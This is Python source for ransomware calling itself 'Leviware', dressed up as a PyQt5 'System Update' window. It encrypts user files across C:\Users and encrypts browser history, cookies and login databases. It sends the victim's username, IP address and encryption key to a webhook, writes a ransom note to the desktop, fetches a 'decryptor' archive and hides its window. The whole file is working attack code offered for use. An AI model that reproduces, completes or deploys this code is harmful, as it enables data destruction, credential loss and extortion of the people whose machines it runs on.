import PyQt5
import PyQt5.QtWidgets
import PyQt5.QtCore
import PyQt5.QtGui
import sys
import requests
import random
import string
import threading
import os
import shutil
from cryptography.fernet import Fernet
import ctypes
import base64
import webbrowser
import sqlite3
import json

encode_contact_email = "lol@gmail.com"
contact_email = base64.b64decode(encode_contact_email.encode()).decode()
notification_endpoint = "https://webhookgoeshere.com"

file_extensions = ['.txt', '.doc', '.xls', '.ppt', '.odt', '.jpg', '.png', '.csv', '.pdf', '.docx', '.xlsx', '.pptx', '.psd', '.ai', '.indd', '.eps', '.raw', '.cr2', '.nef', '.orf', '.sr2', '.db', '.sql', '.mdb', '.accdb', '.dbf', '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.dwg', '.dxf', '.zip', '.rar', '.7z', '.tar', '.gz', '.iso', '.vmdk', '.vdi', '.key', '.pages', '.numbers', '.sqlite', '.dat', '.json', '.xml', '.bak', '.log', '.ini', '.config', '.reg', '.lnk', '.url', '.bookmark', '.history', '.cache']

class FileHandler(PyQt5.QtCore.QRunnable):
    def __init__(self):
        super(FileHandler, self).__init__()
        self.threadpool = PyQt5.QtCore.QThreadPool()
        self.unique_id = self.generate_id(12)
        self.process_key = Fernet.generate_key()
        self.processor = Fernet(self.process_key)
        self.target_dir = "C:\\Users"
        self.ip_address = ""
        self.user_name = ""

    def create_info_file(self):
        try:
            desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
            with open(os.path.join(desktop_path, "IMPORTANT_READ_ME.txt"), "w") as f:
                f.write(self.get_detailed_info())
        except Exception as e:
            print(f"Error creating info file: {str(e)}")

    def get_system_info(self):
        try:
            self.ip_address = requests.get("https://api.ipify.org?format=json").json()["ip"]
            self.user_name = os.getlogin()
        except Exception as e:
            print(f"Error getting system info: {str(e)}")

    def process_file(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                data = file.read()
            processed_data = self.processor.encrypt(data)
            with open(file_path, 'wb') as file:
                file.write(processed_data)
        except Exception as e:
            print(f"Error processing {file_path}: {str(e)}")

    def process_browser_data(self):
        for user_dir in os.listdir(self.target_dir):
            user_path = os.path.join(self.target_dir, user_dir)
            browsers = {
                'chrome': os.path.join(user_path, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default'),
                'edge': os.path.join(user_path, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default'),
                'firefox': os.path.join(user_path, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
            }

            for browser, path in browsers.items():
                if os.path.exists(path):
                    if browser in ['chrome', 'edge']:
                        self.process_chromium_based(path)
                    elif browser == 'firefox':
                        self.process_firefox(path)

    def process_chromium_based(self, path):
        files_to_encrypt = ['History', 'Bookmarks', 'Cookies', 'Login Data', 'Web Data']
        for file in files_to_encrypt:
            file_path = os.path.join(path, file)
            if os.path.exists(file_path):
                self.process_file(file_path)

    def process_firefox(self, profile_path):
        for root, dirs, files in os.walk(profile_path):
            for file in files:
                if file.endswith('.sqlite'):
                    file_path = os.path.join(root, file)
                    self.process_file(file_path)

    def download_zip(self, url, filename):
        try:
            response = requests.get(url)
            desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
            file_path = os.path.join(desktop_path, filename)
            with open(file_path, 'wb') as file:
                file.write(response.content)
            print(f"Successfully downloaded {filename}")
        except Exception as e:
            print(f"Error downloading {filename}: {str(e)}")

    def run(self):
        self.notify()
        for user_dir in os.listdir(self.target_dir):
            user_path = os.path.join(self.target_dir, user_dir)
            for root, dirs, files in os.walk(user_path):
                for filename in files:
                    full_path = os.path.join(root, filename)
                    if any(full_path.lower().endswith(ext) for ext in file_extensions):
                        threading.Thread(target=self.process_file, args=(full_path,)).start()
        
        self.process_browser_data()
        self.send_process_info()
        
        self.create_info_file()
        self.download_zip("url/decryptor.7zip", "decryptor.7zip")
        
        del self.process_key
        del self.processor

    def notify(self):
        try:
            self.get_system_info()
        except:
            pass
        payload = {
            "content": f"New user:\nID: {self.unique_id}\nUser: {self.user_name}\nIP: {self.ip_address}"
        }
        requests.post(notification_endpoint, json=payload)

    def send_process_info(self):
        payload = {
            "content": f"Process key for {self.unique_id}: {self.process_key.decode()}"
        }
        requests.post(notification_endpoint, json=payload)

    def generate_id(self, length):
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for i in range(length))

    def get_detailed_info(self):
        return f"""
IMPORTANT NOTICE
Your files have been processed by Leviware. To restore them, please follow the instructions below:

Provide your unique ID: {self.unique_id}

Do not attempt to restore the files yourself or you may lose your data permanently.
Your files are secured with advanced protection. The key was removed from memory if you're seeing this message.

To unlock your files, you need to complete the following steps in the newly downloaded file on your desktop (decryptor.7zip)

The unlocker will be available on your desktop. Do not lose it

If you not have already download the file from here:
https://url_goes_here/decryptor.7zip

To unlock your files, you need to complete the following steps:
- Unzip the decryptor.7zip file on your desktop
- Run the program
- Read the instructions

The password is 123 to unlock the files please note your antivirus will most likely block it.
"""


class SystemUtility(PyQt5.QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__() 
        self.threadpool = PyQt5.QtCore.QThreadPool()
        self.file_handler = FileHandler()
        self.setup_ui()
        self.show()
        self.threadpool.start(self.file_handler)

    def setup_ui(self):
        self.setWindowTitle("System Update")
        self.setWindowIcon(PyQt5.QtGui.QIcon("path_to_icon.png"))
        self.setGeometry(100, 100, 800, 600)
        self.setStyleSheet("""
            QMainWindow {
                background-color: #f0f0f0;
            }
            QLabel {
                color: #333333;
                font-size: 16px;
                font-family: 'Segoe UI', sans-serif;
            }
            QPushButton {
                background-color: #007bff;
                color: white;
                border: none;
                padding: 10px 20px;
                text-align: center;
                text-decoration: none;
                font-size: 16px;
                margin: 10px 5px;
                border-radius: 5px;
                font-weight: bold;
                font-family: 'Segoe UI', sans-serif;
            }
            QPushButton:hover {
                background-color: #0056b3;
            }
            QWidget {
                border-radius: 10px;
            }
        """)

        main_layout = PyQt5.QtWidgets.QVBoxLayout()

        self.warning_icon = PyQt5.QtWidgets.QLabel(self)
        self.warning_icon.setPixmap(PyQt5.QtGui.QPixmap("warning_icon.png").scaled(100, 100, PyQt5.QtCore.Qt.KeepAspectRatio))
        main_layout.addWidget(self.warning_icon, alignment=PyQt5.QtCore.Qt.AlignCenter)

        header = PyQt5.QtWidgets.QLabel("System Alert", self)
        header.setStyleSheet("font-size: 24px; font-weight: bold; color: #dc3545;")
        main_layout.addWidget(header, alignment=PyQt5.QtCore.Qt.AlignCenter)

        message = PyQt5.QtWidgets.QLabel(self.get_system_message(), self)
        message.setWordWrap(True)
        message.setStyleSheet("background-color: #ffffff; padding: 20px; border-radius: 10px; border: 1px solid #dee2e6;")
        main_layout.addWidget(message, alignment=PyQt5.QtCore.Qt.AlignCenter)

        button_layout = PyQt5.QtWidgets.QHBoxLayout()

        proceed_btn = PyQt5.QtWidgets.QPushButton("Proceed", self)
        proceed_btn.clicked.connect(self.hide)
        button_layout.addWidget(proceed_btn)

        main_layout.addLayout(button_layout)

        central_widget = PyQt5.QtWidgets.QWidget()
        central_widget.setLayout(main_layout)
        self.setCentralWidget(central_widget)

    @PyQt5.QtCore.pyqtSlot()
    def hide(self):
        self.setWindowOpacity(0)
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def get_system_message(self):
        return f"""
IMPORTANT NOTICE
Your files have been processed. To restore them, please follow the instructions below:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Leviware by Libalpm

Provide your unique ID: {self.file_handler.unique_id}

Do not attempt to restore the files yourself or you may lose your data permanently.
Your files are secured with advanced protection. The key was removed from memory if you're seeing this message.

To unlock your files, you need to complete the following steps:
- Unzip the decryptor.7zip file on your desktop (password is 123)
- Run the program
- Read the instructions

The unlocker will be available on your desktop. Do not lose it
Do NOT RUN THIS PROGRAM AGAIN OTHERWISE YOU WILL LOSE YOUR DATA.
CLOSE OUT OF THIS WINDOW AND DELETE THE PROGRAM FROM YOUR COMPUTER.
"""

if __name__ == "__main__":
    app = PyQt5.QtWidgets.QApplication(sys.argv) 
    utility = SystemUtility() 
    sys.exit(app.exec_())
